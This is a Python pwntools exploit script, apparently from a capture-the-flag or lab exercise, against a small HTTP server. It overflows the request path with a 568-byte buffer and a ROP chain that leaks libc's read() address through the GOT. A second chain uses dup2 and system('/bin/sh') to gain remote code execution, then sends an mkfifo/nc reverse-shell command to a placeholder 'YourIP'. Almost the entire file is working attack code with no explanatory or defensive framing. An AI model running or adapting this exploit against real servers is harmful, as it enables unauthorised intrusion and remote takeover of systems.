#!/usr/bin/python
import os, sys, socket
import struct
from pwn import *
import urllib

HOST = sys.argv[1]
PORT = sys.argv[2]

## offsets ##
read_off = 0x0f7250       #libc_read_offset
system_off = 0x045390     #libc_system_offset
dup2_off = 0x0f7970       #libc_dup2_offset
write_off = 0x0f72b0      #libc_write_offset
binsh_off = 0x18cd57      #libc_bin/sh
execve_off = 0x0cc770     #libc_execve_offset

s = remote(HOST,PORT)

print "---------------------------------------------------------> Running Tiny Exploit....."
print "---------------------------------------------------------> Leaking read() address..."
payload = ""
payload += "A"*568 
payload += p64(0x4011dd) #pop rdi; ret
payload += p64(0x4)      #stdout # fd arg
payload += p64(0x4011db) #pop rsi; pop r15; ret
payload += p64(0x603088) #read() in GOT
payload += p64(0xFF)     #junk for r15
payload += p64(0x400c50) #write() call loc

s = remote(HOST,PORT)
s.send("GET /"+urllib.quote_plus(payload)+" HTTP/1.1\r\nHost: "+HOST+"\r\n\r\n")
res = u64(s.recv(1024)[94:94+8])
#log.info("read() at: %s" % hex(u64(s.recv(1024)[94:94+8])))
print "---------------------------------------------------------> read() address found @ %s" % hex(res)
libc = res - read_off
print "---------------------------------------------------------> Calculating addresses from leaked read()"
print "---------------------------------------------------------> libc base address    @ %s" % hex(libc)
libc_sys = libc + system_off
print "---------------------------------------------------------> system() address     @ %s" % hex(libc_sys)
libc_exe = libc + execve_off
print "---------------------------------------------------------> execve() address     @ %s" % hex(libc_exe)
libc_dup2 = libc + dup2_off
print "---------------------------------------------------------> dup2() address       @ %s" % hex(libc_dup2)
libc_binsh = libc + binsh_off
print "---------------------------------------------------------> /bin/sh called       @ %s" % hex(libc_binsh)
print "---------------------------------------------------------> trying RCE.............."
s.close

s = remote(HOST,PORT)
print "---------------------------------------------------------> Sending Payload........."
payload = ''
payload += 'A' * 568
#dup2 4,0
payload += p64(0x4011dd) #pop rdi ; ret
payload += p64(0x4) # stdin/stdout for app
payload += p64(0x4011db) #pop rsi ; pop r15 ; ret
payload += p64(0x0) # stdin
payload += p64(0xFF) # junk
payload += p64(libc_dup2) # dup2_libc
#dup 4,1
payload += p64(0x4011dd) #pop rdi ; ret
payload += p64(0x4) # stdin/stdout for app
payload += p64(0x4011db) #pop rsi ; pop r15 ; ret
payload += p64(0x1) # stdout
payload += p64(0xFF) # junk
payload += p64(libc_dup2) # dup2_libc
#pop ret; /bin/sh ; system() # /bin/sh found using gdb, calculating offset etc.
payload += p64(0x4011dd) #pop rdi ; ret
payload += p64(libc_binsh)
#payload += p64(libc_exe) #execve()
payload += p64(libc_sys) #system() 

s = remote(HOST,PORT)
s.send("GET /"+urllib.quote_plus(payload)+" HTTP/1.1\r\nHost: "+HOST+"\r\n\r\n")
print s.recv(1024)
s.send("whoami"+"\n")
print s.recv(1024)
s.send("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "YourIP" 9002 >/tmp/f"+"\n")
print s.recv(1024)
s.send("pwd"+"\n")
print s.recv(1024)
s.send("ls -alh /tmp/"+"\n")
print s.recv(1024)

s.close
